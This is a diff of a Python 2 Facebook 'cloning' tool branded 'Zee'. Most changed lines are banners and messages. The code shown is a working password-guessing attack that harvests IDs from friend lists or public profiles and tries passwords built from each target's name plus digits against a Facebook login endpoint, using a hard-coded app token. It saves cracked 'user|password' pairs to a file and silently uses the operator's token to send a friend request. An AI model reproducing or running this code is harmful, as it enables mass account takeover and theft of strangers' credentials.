@@ -47,17 +47,17 @@ def jalan(z):
 
 
 #### LOGO ####
-"""
+logo = """
 \033[1;97m╭━━━━╮
 \033[1;97m╰━━╮━┃
 \033[1;97m╱╱╭╯╭╋━━┳━━╮
 \033[1;97m╱╭╯╭╯┃┃━┫┃━┫
 \033[1;97m╭╯━╰━┫┃━┫┃━┫
-\033[1;97m╰━━━━┻━━┻━━╯ 
+\033[1;97m╰━━━━┻━━┻━━╯   
 \033[1;93m🔥╭╬──────────────────────────────────╬╮🔥
-\033[0;94m  ⚡ 🧬🧬 𝕮𝖗𝖊𝖆𝖙𝖔𝖗 ✪ 𝕸𝖗.Z̸̡͇̔̀͘͜ë̴̦̪́̿̈́͜è̵̡͖̪̈́͌ Creation 🧬🧬
-\033[0;97m  ⚡ 𝐄𝐦 𝐍𝐨𝐭 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐢𝐛𝐥𝐞 𝐅𝐨𝐫 𝐚𝐧𝐲 𝐌𝐢𝐬𝐬 𝐔𝐬𝐞⚡
-\033[1;97m  ⚡ 🧬🧬 𝐂𝐫𝐚𝐜𝐤 𝐓𝐡𝐞 𝐖𝐨𝐫𝐥𝐝 𝐖𝐢𝐭𝐡 𝐙𝐞𝐞 🧬🧬
+\033[0;94m  ⚡𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 𝐙𝐞𝐞𝐒𝐡𝐚𝐚𝐧 ⚡
+\033[0;94m  ⚡𝐂𝐫𝐚𝐜𝐤 𝐓𝐡𝐞 𝐖𝐨𝐫𝐥𝐝 𝐖𝐢𝐭𝐡 𝐙𝐞𝐞  ⚡
+\033[0;97m  ⚡𝐄𝐦 𝐍𝐨𝐭 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐢𝐛𝐥𝐞 𝐅𝐨𝐫 𝐚𝐧𝐲 𝐌𝐢𝐬𝐬 𝐔𝐬𝐞⚡
 \033[1;93m🔥╰╬──────────────────────────────────╬╯🔥 """
                                                 
 def tik():
@@ -77,19 +77,21 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\033[1;94m╭━━━━╮
-\033[1;96m╰━━╮━ Zee Updated V.1.1.3
-\033[1;92m╱╱╭╯╭╋━━┳━━╮
-\033[1;96m╱╭╯╭╯┃┃━┫┃━┫
-\033[1;94m╭╯━╰━┫┃━┫┃━┫
-\033[1;92m╰━━━━┻━━┻━━╯"""
-jalan("\033[1;96m╭━━━━╮
-jalan("\033[1;96m╰━━╮━┃
-jalan("\033[1;96m╱╱╭╯╭╋━━┳━━jalan("\033[1;96m╮
-jalan("\033[1;96m╱╭╯╭╯┃┃━┫┃━jalan("\033[1;96m┫
-jalan("\033[1;96m╭╯━╰━┫┃━┫┃━┫
-jalan("\033[1;96m╰━━━━┻━━┻━━╯
-jalan("\033[1;93m Welcome to Zee Creations")
+\033[1;97m╭━━━━╮
+\033[1;97m╰━━╮━┃
+\033[1;97m╱╱╭╯╭╋━━┳━━╮
+\033[1;97m╱╭╯╭╯┃┃━┫┃━┫
+\033[1;97m╭╯━╰━┫┃━┫┃━┫
+\033[1;97m╰━━━━┻━━┻━━╯"""
+
+jalan("\033[1;96m•◈•────────────•◈•\033[1;99mCracker\033[1;99m•◈•────────────•◈•")                        
+jalan("\033[1;96m  ___ _    __   __  _  ___  ___ ")  
+jalan("\033[1;96m / _/| |  /__\ |  \| || __|| _ \ CLONE ALL COUNTRY")
+jalan("\033[1;96m| \__| |_| \/ || | ' || _| | v / ") 
+jalan("\033[1;96m \__/|___|\__/ |_|\__||___||_|_\ ") 
+jalan("\033[1;97m 𝐄𝐦 𝐍𝐨𝐭 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐢𝐛𝐥𝐞 𝐅𝐨𝐫 𝐚𝐧𝐲 𝐌𝐢𝐬𝐬 𝐔𝐬𝐞")
+jalan("\033[1;97m 𝐂𝐫𝐚𝐜𝐤 𝐓𝐡𝐞 𝐖𝐨𝐫𝐥𝐝 𝐖𝐢𝐭𝐡 𝐙𝐞𝐞")
+jalan("\033[1;93m Welcome to Z̸̡͇̔̀͘͜ë̴̦̪́̿̈́͜è̵̡͖̪̈́͌ Creations")
 jalan("\033[1;96m•◈•──────────•◈•\033[1;96mBlacktiger\033[1;96m•◈•──────────•◈•")
 
 CorrectUsername = "Zee"
@@ -101,14 +103,14 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97m🗝 \x1b[1;95mENTER PASSWORD\x1b[1;97m»» \x1b[1;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:Zee
+            print "Logged in Successfully as " + username #Dev:Zee
 	    time.sleep(2)
             loop = 'false'
         else:
-            print "\033[1;96mGhalat Password"
+            print "\033[1;96mWrong Password"
             os.system('xdg-open https://m.facebook.com/Kudiyan.Da.Prince')
     else:
-        print "\033[1;96mGhalat Username"
+        print "\033[1;96mWrong Username"
         os.system('xdg-open https://m.facebook.com/Kudiyan.Da.Prince')
 
 def login():
@@ -120,7 +122,7 @@ def login():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		print('\033[1;96m[⚡] \x1b[1;93mLogin Fresh Facebook ID\x1b[1;93m[⚡]' )
+		print('\033[1;96m[⚡] \x1b[1;93mLogin Fresh Facebook Account\x1b[1;93m[⚡]' )
 		id = raw_input('\033[1;963m[+] \x1b[0;34mEnter ID/Email \x1b[1;93m: \x1b[1;93m')
 		pwd = raw_input('\033[1;93m[+] \x1b[0;34mEnter Password \x1b[1;93m: \x1b[1;93m')
 		tik()
@@ -150,19 +152,19 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open https://m.facebook.com/Kudiyan.Da.Prince')
+				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;96m[!] \x1b[1;91mAisa lagta hai apka account checkpoint pe hai")
+			print("\n\033[1;96m[!] \x1b[1;91mAisa Lagta Hai Apka Account Checkpoint Pe Hai")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email ghalat hai")
+			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email Ghalat hai")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -203,7 +205,7 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;36;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
 	print "\033[1;32;40m[1] \033[1;33;41mHack The World"	
-	print "\033[1;32;40m[2] \033[1;33;42mUpdate Aahil"																														
+	print "\033[1;32;40m[2] \033[1;33;42mUpdate Zee"																														
 	print "\033[1;32;40m[0] \033[1;33;43mLog out"
 	pilih()
 	
@@ -242,9 +244,9 @@ def super():
 	os.system('clear')
 	print logo
 	print "\x1b[1;32;40m[type1] \033[1;33;41mHack From Friend List"
-	print "\x1b[1;32;40m[type2] \033[1;33;42mHack From Public ID"
-	print "\x1b[1;32;40m[type3] \033[1;33;43mHack Bruteforce"
-	print "\x1b[1;32;40m[type4] \033[1;33;44mHack From File"
+	print "\x1b[1;32;40m[type2] \033[1;33;41mHack From Public ID"
+	print "\x1b[1;32;40m[type3] \033[1;33;41mHack Target Bruteforce"
+	print "\x1b[1;32;40m[type4] \033[1;33;41mHack From File"
 	print "\x1b[1;32;40m[type0] \033[1;33;45mBack"
 	pilih_super()
 
@@ -272,7 +274,7 @@ def pilih_super():
 			op = json.loads(jok.text)
 			print"\033[1;31;40m[✺] Name : "+op["name"]
 		except KeyError:
-			print"\x1b[1;92m[✺] ID Naii Hegi!"
+			print"\x1b[1;92m[✺] ID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
 			super()
 		print"\033[1;35;40m[✺] Getting IDs..."
@@ -329,13 +331,13 @@ def pilih_super():
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' ⚡ ' + b['name']
+					print '\x1b[1;36;40m[HACKED] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' ⚡ ' + b['name']
 					cek = open("out/CP.txt", "a")
 					cek.write(user+"|"+pass1+"\n")
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
-					pass2 = b['first_name'] + '123'
+					pass2 = b['first_name'] + '111'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
@@ -357,7 +359,7 @@ def pilih_super():
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;36;40m[Hacked] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' ⚡ ' + b['name']
+									print '\x1b[1;36;40m[HACKED] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' ⚡ ' + b['name']
 									cek = open("out/CP.txt", "a")
 									cek.write(user+"|"+pass3+"\n")
 									cek.close()
@@ -377,7 +379,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = '786113'
+											pass5 = '786786'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -391,7 +393,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = b['last_name'] + '113'
+													pass6 = b['last_name'] + '123'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
